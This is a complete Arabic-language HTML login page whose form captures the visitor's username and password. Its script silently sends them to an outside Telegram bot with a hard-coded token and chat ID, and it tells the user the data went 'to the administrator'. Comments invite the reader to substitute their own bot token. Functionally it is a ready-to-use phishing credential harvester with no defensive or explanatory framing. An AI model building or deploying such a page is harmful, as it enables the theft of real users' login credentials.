<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        .input-group { margin-bottom: 15px; text-align: right; }
        .input-group input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        .login-btn { background: #0088cc; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>تسجيل الدخول</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="username">اسم المستخدم</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault(); // منع إعادة تحميل الصفحة
            
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            // إرسال البيانات إلى بوت Telegram
            const botToken = "7466285172:AAE52LUEGLXKJGF6DYLMLD8L4sbu6N-O714"; // استبدله بـ API Token الخاص بك
            const chatId = "5936618730"; // استبدله بـ Chat ID الخاص بك
            const message = `📌 بيانات تسجيل دخول جديدة:\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    alert("تم إرسال البيانات إلى المسؤول!");
                })
                .catch(error => {
                    console.error("Error:", error);
                });
        });
    </script>
</body>
</html>
